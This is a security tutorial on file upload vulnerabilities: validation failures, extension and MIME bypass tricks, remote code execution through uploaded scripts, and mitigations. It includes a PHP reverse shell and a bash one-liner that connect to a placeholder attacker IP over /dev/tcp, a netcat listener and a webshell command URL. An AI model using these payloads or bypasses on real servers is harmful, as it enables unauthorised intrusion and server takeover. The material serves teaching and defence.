# Topic - File Upload vulnerability
File Upload Vulnerability:

Overview:
A file upload vulnerability occurs when a web application allows users to upload files without properly validating or restricting the uploaded content. Attackers exploit this weakness to upload malicious files that may lead to Remote Code Execution (RCE), reverse shells, malware hosting, phishing pages, or complete server compromise.

How File Upload Functionality Works:
Modern web applications commonly allow users to upload files such as:
- Profile pictures
- PDFs
- Documents
- Videos
- Attachments
- ZIP archives

The upload process generally follows this flow:
1. User selects a file
2. Browser sends HTTP POST request
3. Server receives the file
4. Validation checks occur
5. File gets stored on disk or cloud storage

If validation mechanisms are weak or missing, attackers can upload executable malicious files.

Why File Upload Vulnerabilities Are Dangerous:
File upload vulnerabilities are dangerous because they provide direct interaction with the server filesystem. If uploaded files are executed by the server, attackers can gain full control over the target machine.

Potential impacts include:
- Remote Code Execution
- Reverse shell access
- Server takeover
- Data theft
- Credential compromise
- Malware deployment
- Website defacement
- Internal network access
- Privilege escalation

A single vulnerable upload endpoint may compromise the entire infrastructure.

Why Attackers Prefer File Upload Vulnerabilities:
Attackers frequently target upload functionality because exploitation is often simple and highly impactful.
Benefits for attackers include:
- Persistent server access
- Web shell deployment
- Command execution
- Reverse shell establishment
- Security control bypass
- Malware hosting
- Lateral movement
- Phishing page hosting

Upload vulnerabilities are commonly used during post-exploitation phases as well.



Common Validation Failures:

Extension Validation Failure:
Applications only check file extensions instead of real content.
Example:
```txt
shell.php
```
Blacklist Filtering:
Applications block `.php` but forget alternative executable extensions.
Blocked:
```txt
.php
```
Bypasses:
```txt
.php5
.phtml
.phar
.pht
.php7
```

---

Double Extension Bypass:
Weak validation may only check the last extension.
Examples:
```txt
shell.php.jpg
payload.png.php
avatar.jpeg.phtml
```
MIME Type Validation Failure:
Applications trust user-controlled MIME types.
Example request:
```http
Content-Type: image/jpeg
```
Even when the file contains PHP code.

Remote Code Execution (RCE):
Remote Code Execution occurs when uploaded files are interpreted and executed by the server.
Typical attack flow:
1. Upload malicious script
2. Access uploaded file
3. Server executes attacker-controlled code
4. Attacker gains command execution

Example:
```txt
http://target.com/uploads/shell.php?cmd=whoami
```

Successful RCE may result in complete server compromise.

Reverse Shells:
A reverse shell allows the target server to initiate a connection back to the attacker’s machine.
This provides interactive terminal access.

PHP Reverse Shell:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'");
?>
```

Listener:

```bash
nc -lvnp 4444
```

---

Bash Reverse Shell:

```bash
bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
```

---



Validate File Content:
Verify actual file signatures instead of extensions.
Store Files Outside Web Root:
Uploaded files should never be executable.
Safe example:
```txt
/opt/uploads/
```
Rename Uploaded Files:
Generate randomized filenames.
Example:
```txt
9af81c2d.png
```
Disable Script Execution:

Example Apache configuration:
```apache
php_admin_flag engine off
```

Set Proper Permissions:
Restrict execution permissions.
Example:
```bash
chmod 644 uploaded_file
```
Scan Uploaded Files:
Use antivirus and malware scanners.
Examples:
- ClamAV
- Windows Defender
- CrowdStrike

Always validate:

- Extension
- MIME type
- File content
- File size
- Storage location
- Execution permissions

Improper upload handling can lead to complete infrastructure compromise.
File upload vulnerabilities remain one of the most dangerous and commonly exploited web application vulnerabilities.
